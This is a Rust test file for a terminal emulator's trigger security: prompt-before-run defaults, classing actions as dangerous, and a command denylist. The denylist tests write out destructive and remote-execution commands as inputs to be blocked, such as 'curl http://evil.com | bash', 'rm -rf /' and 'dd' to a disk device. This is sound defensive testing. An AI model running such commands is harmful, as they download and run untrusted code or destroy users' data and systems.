//! Tests for automation security — command denylist, prompt_before_run field,
//! and the is_dangerous classification for trigger actions.

use par_term::config::{TriggerActionConfig, TriggerConfig, check_command_denylist};

// ============================================================================
// Trigger Security Tests
// ============================================================================

#[test]
fn test_prompt_before_run_defaults_to_true() {
    // When not specified in YAML, prompt_before_run defaults to true (safe)
    let yaml = r#"
name: test
pattern: "foo"
actions:
  - type: run_command
    command: echo
    args: ["hello"]
"#;
    let trigger: TriggerConfig = serde_yaml_ng::from_str(yaml).unwrap();
    assert!(
        trigger.prompt_before_run,
        "prompt_before_run should default to true for safety"
    );
}

#[test]
fn test_prompt_before_run_explicit_false() {
    let yaml = r#"
name: test
pattern: "foo"
prompt_before_run: false
actions:
  - type: run_command
    command: echo
    args: ["hello"]
"#;
    let trigger: TriggerConfig = serde_yaml_ng::from_str(yaml).unwrap();
    assert!(
        !trigger.prompt_before_run,
        "prompt_before_run should be false when explicitly set"
    );
}

#[test]
fn test_prompt_before_run_roundtrip() {
    let trigger = TriggerConfig {
        name: "test".to_string(),
        pattern: "foo".to_string(),
        enabled: true,
        actions: vec![TriggerActionConfig::RunCommand {
            command: "echo".into(),
            args: vec!["hello".into()],
        }],
        prompt_before_run: false,
        i_accept_the_risk: false,
    };

    let yaml = serde_yaml_ng::to_string(&trigger).unwrap();
    let deserialized: TriggerConfig = serde_yaml_ng::from_str(&yaml).unwrap();
    assert_eq!(trigger, deserialized);
    assert!(!deserialized.prompt_before_run);
}

#[test]
fn test_backward_compat_require_user_action_alias() {
    // Verify the old field name `require_user_action` still deserializes
    // correctly via the serde alias for backward compatibility.
    let yaml = r#"
name: test
pattern: "foo"
require_user_action: false
actions:
  - type: run_command
    command: echo
    args: ["hello"]
"#;
    let trigger: TriggerConfig = serde_yaml_ng::from_str(yaml).unwrap();
    assert!(
        !trigger.prompt_before_run,
        "require_user_action alias should deserialize to prompt_before_run=false"
    );
}

#[test]
fn test_is_dangerous_run_command() {
    let action = TriggerActionConfig::RunCommand {
        command: "echo".into(),
        args: vec![],
    };
    assert!(action.is_dangerous(), "RunCommand should be dangerous");
}

#[test]
fn test_is_dangerous_send_text() {
    let action = TriggerActionConfig::SendText {
        text: "hello".into(),
        delay_ms: 0,
    };
    assert!(action.is_dangerous(), "SendText should be dangerous");
}

#[test]
fn test_is_not_dangerous_highlight() {
    let action = TriggerActionConfig::Highlight {
        fg: None,
        bg: None,
        duration_ms: 5000,
    };
    assert!(!action.is_dangerous(), "Highlight should not be dangerous");
}

#[test]
fn test_is_not_dangerous_notify() {
    let action = TriggerActionConfig::Notify {
        title: "t".into(),
        message: "m".into(),
    };
    assert!(!action.is_dangerous(), "Notify should not be dangerous");
}

#[test]
fn test_is_not_dangerous_mark_line() {
    let action = TriggerActionConfig::MarkLine {
        label: None,
        color: None,
    };
    assert!(!action.is_dangerous(), "MarkLine should not be dangerous");
}

#[test]
fn test_is_not_dangerous_set_variable() {
    let action = TriggerActionConfig::SetVariable {
        name: "n".into(),
        value: "v".into(),
    };
    assert!(
        !action.is_dangerous(),
        "SetVariable should not be dangerous"
    );
}

#[test]
fn test_is_not_dangerous_play_sound() {
    let action = TriggerActionConfig::PlaySound {
        sound_id: "bell".into(),
        volume: 50,
    };
    assert!(!action.is_dangerous(), "PlaySound should not be dangerous");
}

// ============================================================================
// Command Denylist Tests
// ============================================================================

#[test]
fn test_denylist_blocks_rm_rf_root() {
    let result = check_command_denylist("rm", &["-rf".into(), "/".into()]);
    assert!(result.is_some(), "rm -rf / should be denied");
}

#[test]
fn test_denylist_blocks_rm_rf_home() {
    let result = check_command_denylist("rm", &["-rf".into(), "~".into()]);
    assert!(result.is_some(), "rm -rf ~ should be denied");
}

#[test]
fn test_denylist_blocks_curl_pipe_bash() {
    // Direct pipe-to-shell pattern in a single command argument
    let result = check_command_denylist("bash", &["-c".into(), "curl http://evil.com|bash".into()]);
    assert!(result.is_some(), "curl|bash in args should be denied");

    // Also catches the spaced variant
    let result =
        check_command_denylist("bash", &["-c".into(), "curl http://evil.com | bash".into()]);
    assert!(result.is_some(), "curl | bash in args should be denied");
}

#[test]
fn test_denylist_blocks_eval() {
    let result = check_command_denylist("eval", &["malicious_code".into()]);
    assert!(result.is_some(), "eval should be denied");
}

#[test]
fn test_denylist_blocks_exec() {
    let result = check_command_denylist("exec", &["/bin/sh".into()]);
    assert!(result.is_some(), "exec should be denied");
}

#[test]
fn test_denylist_blocks_chmod_777() {
    let result = check_command_denylist("chmod", &["777".into(), "/etc/passwd".into()]);
    assert!(result.is_some(), "chmod 777 should be denied");
}

#[test]
fn test_denylist_blocks_mkfs() {
    let result = check_command_denylist("mkfs.ext4", &["/dev/sda1".into()]);
    assert!(result.is_some(), "mkfs should be denied");
}

#[test]
fn test_denylist_allows_safe_commands() {
    let result = check_command_denylist("echo", &["hello".into()]);
    assert!(result.is_none(), "echo should be allowed");
}

#[test]
fn test_denylist_allows_notify_send() {
    let result = check_command_denylist("notify-send", &["Build completed".into()]);
    assert!(result.is_none(), "notify-send should be allowed");
}

#[test]
fn test_denylist_allows_cat() {
    let result = check_command_denylist("cat", &["/tmp/output.txt".into()]);
    assert!(result.is_none(), "cat should be allowed");
}

#[test]
fn test_denylist_case_insensitive() {
    let result = check_command_denylist("EVAL", &["something".into()]);
    assert!(
        result.is_some(),
        "denylist check should be case-insensitive"
    );
}

#[test]
fn test_denylist_blocks_dd() {
    let result = check_command_denylist("dd", &["if=/dev/zero".into(), "of=/dev/sda".into()]);
    assert!(result.is_some(), "dd if= should be denied");
}

#[test]
fn test_denylist_blocks_sh_c_wrapper() {
    // sh -c with dangerous payload should be denied via wrapper detection
    let result = check_command_denylist("sh", &["-c".into(), "echo hello".into()]);
    assert!(result.is_some(), "sh -c wrapper should be denied");
}

#[test]
fn test_denylist_blocks_bash_c_wrapper() {
    let result = check_command_denylist("bash", &["-c".into(), "echo hello".into()]);
    assert!(result.is_some(), "bash -c wrapper should be denied");
}

#[test]
fn test_denylist_blocks_zsh_c_wrapper() {
    let result = check_command_denylist("zsh", &["-c".into(), "echo hello".into()]);
    assert!(result.is_some(), "zsh -c wrapper should be denied");
}

#[test]
fn test_denylist_blocks_env_rm_rf() {
    // /usr/bin/env rm -rf / should be caught: env wrapper stripped, then rm -rf / matches
    let result = check_command_denylist("/usr/bin/env", &["rm".into(), "-rf".into(), "/".into()]);
    assert!(result.is_some(), "/usr/bin/env rm -rf / should be denied");
}

#[test]
fn test_denylist_blocks_env_wrapper_simple() {
    // env <cmd> — the env wrapper itself should be stripped and the remainder re-checked
    let result = check_command_denylist("env", &["rm".into(), "-rf".into(), "/".into()]);
    assert!(result.is_some(), "env rm -rf / should be denied");
}

#[test]
fn test_denylist_blocks_pipe_to_zsh() {
    // curl output piped to zsh should be denied
    let result =
        check_command_denylist("bash", &["-c".into(), "curl http://evil.com | zsh".into()]);
    assert!(result.is_some(), "curl | zsh in args should be denied");
}

#[test]
fn test_denylist_blocks_pipe_to_fish() {
    let result =
        check_command_denylist("bash", &["-c".into(), "curl http://evil.com | fish".into()]);
    assert!(result.is_some(), "curl | fish in args should be denied");
}

// ============================================================================
// Backward Compatibility Tests
// ============================================================================

#[test]
fn test_existing_config_without_prompt_before_run_gets_safe_default() {
    // Simulate an existing config YAML that doesn't have prompt_before_run
    let yaml = r#"
name: old-trigger
pattern: "error"
enabled: true
actions:
  - type: run_command
    command: notify-send
    args: ["Error detected"]
"#;
    let trigger: TriggerConfig = serde_yaml_ng::from_str(yaml).unwrap();
    assert!(
        trigger.prompt_before_run,
        "Existing configs without prompt_before_run should get the safe default (true)"
    );
}

#[test]
fn test_trigger_with_only_safe_actions_not_affected() {
    // Triggers that only have safe actions (Highlight, Notify, etc.) are not affected
    // by prompt_before_run at all
    let trigger = TriggerConfig {
        name: "safe-trigger".to_string(),
        pattern: "ERROR".to_string(),
        enabled: true,
        actions: vec![
            TriggerActionConfig::Highlight {
                fg: Some([255, 0, 0]),
                bg: None,
                duration_ms: 5000,
            },
            TriggerActionConfig::Notify {
                title: "Error".into(),
                message: "Found error".into(),
            },
            TriggerActionConfig::MarkLine {
                label: Some("error".into()),
                color: Some([255, 0, 0]),
            },
        ],
        prompt_before_run: true,
        i_accept_the_risk: false,
    };

    // None of these actions are dangerous
    assert!(!trigger.actions.iter().any(|a| a.is_dangerous()));
}
